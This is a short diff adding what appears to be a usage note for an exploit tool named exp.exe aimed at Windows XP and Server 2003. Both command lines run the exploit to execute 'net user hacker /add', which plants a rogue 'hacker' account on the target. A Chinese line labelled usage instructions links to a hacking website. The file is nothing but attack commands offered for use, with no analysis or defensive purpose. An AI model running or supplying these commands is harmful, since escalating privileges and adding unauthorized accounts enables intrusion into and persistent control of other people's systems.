@@ -1,0 +1,4 @@
+XP:exp.exe XP "net user hacker /add"
+2003:exp.exe 2K3 "net user hacker /add"
+
+使用说明：http://www.007hack.com/?p=667
